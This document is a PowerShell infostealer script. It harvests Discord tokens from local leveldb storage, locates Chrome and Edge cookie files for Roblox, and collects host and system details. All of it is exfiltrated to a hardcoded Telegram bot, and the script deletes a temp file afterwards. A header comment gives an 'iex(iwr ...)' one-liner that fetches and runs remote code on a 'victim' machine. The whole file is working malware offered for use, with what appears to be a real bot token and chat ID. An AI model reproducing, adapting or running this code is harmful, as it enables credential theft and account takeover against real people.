# Self-contained payload - steals Roblox/Discord tokens and sends to Telegram
# Run this command in PowerShell on the victim VM:
# iex(iwr ([System.Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('REPLACE_ME'))) -UseBasicParsing)

[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12

$botToken = "8785045003:AAGsICsqOyT3t_luH2Y4WQSJ746dnbZZby4"
$chatId = "8445047233"

# === SEND TO TELEGRAM ===
function Send-Telegram {
    param([string]$Message)
    try {
        Invoke-RestMethod -Uri "https://api.telegram.org/bot$botToken/sendMessage" -Method Post -Body @{
            chat_id = $chatId
            text = $Message
            parse_mode = "HTML"
        } -ErrorAction Stop | Out-Null
    } catch {
        try {
            $body = "chat_id=$chatId&text=$([Uri]::EscapeDataString($Message))"
            $wc = New-Object System.Net.WebClient
            $wc.Headers.add("Content-Type", "application/x-www-form-urlencoded")
            $wc.UploadString("https://api.telegram.org/bot$botToken/sendMessage", $body) | Out-Null
        } catch {}
    }
}

# === STEAL DISCORD TOKENS ===
function Get-DiscordTokens {
    $discordPaths = @(
        "$env:APPDATA\discord\Local Storage\leveldb",
        "$env:APPDATA\discordcanary\Local Storage\leveldb",
        "$env:APPDATA\discordptb\Local Storage\leveldb"
    )
    $tokens = @()
    $tokenRegex = '[a-zA-Z0-9]{24}\.[a-zA-Z0-9]{6}\.[a-zA-Z0-9_-]{27}'
    foreach ($path in $discordPaths) {
        if (Test-Path $path) {
            Get-ChildItem -Path $path -Include "*.ldb","*.log" -Recurse | foreach {
                try {
                    $content = Get-Content $_.FullName -Raw -ErrorAction SilentlyContinue
                    [regex]::Matches($content, $tokenRegex) | foreach { $tokens += $_.Value }
                } catch {}
            }
        }
    }
    return $tokens | Select-Object -Unique
}

# === STEAL ROBLOX COOKIES ===
function Get-RobloxCookies {
    $cookiePaths = @(
        "$env:LOCALAPPDATA\Google\Chrome\User Data\Default\Cookies",
        "$env:LOCALAPPDATA\Microsoft\Edge\User Data\Default\Cookies"
    )
    $found = @()
    foreach ($path in $cookiePaths) {
        if (Test-Path $path) { $found += $path }
    }
    return $found
}

# === MAIN ===
$hostname = $env:COMPUTERNAME
$username = $env:USERNAME
$timestamp = Get-Date -Format "yyyy-MM-dd HH:mm:ss"

# Build report
$report = "<b>[+] VICTIM DATA</b>`n"
$report += "Host: <code>$hostname</code>`n"
$report += "User: <code>$username</code>`n"
$report += "Time: <code>$timestamp</code>`n"

# Discord
$discordTokens = Get-DiscordTokens
if ($discordTokens) {
    $report += "`n<b>DISCORD TOKENS:</b>`n"
    $discordTokens | foreach { $report += "<code>$_</code>`n" }
} else {
    $report += "`nDiscord: No tokens found"
}

# Roblox
$robloxData = Get-RobloxCookies
if ($robloxData) {
    $report += "`n<b>ROBLOX:</b>`n"
    $robloxData | foreach { $report += "$_`n" }
} else {
    $report += "`nRoblox: No cookies found"
}

# System info
$report += "`n<b>SYSTEM:</b>`n"
try {
    $os = (Get-CimInstance Win32_OperatingSystem).Caption
    $ram = [math]::Round((Get-CimInstance Win32_ComputerSystem).TotalPhysicalMemory/1GB,2)
    $report += "OS: $os`nRAM: $ram GB"
} catch {
    $report += "System info error"
}

# Send to Telegram
Send-Telegram -Message $report
Send-Telegram -Message "[+] PAYLOAD EXECUTED on $hostname by $username at $timestamp"

# Cleanup and exit
Remove-Item "$env:TEMP\svchost_cache.dat" -Force -ErrorAction SilentlyContinue
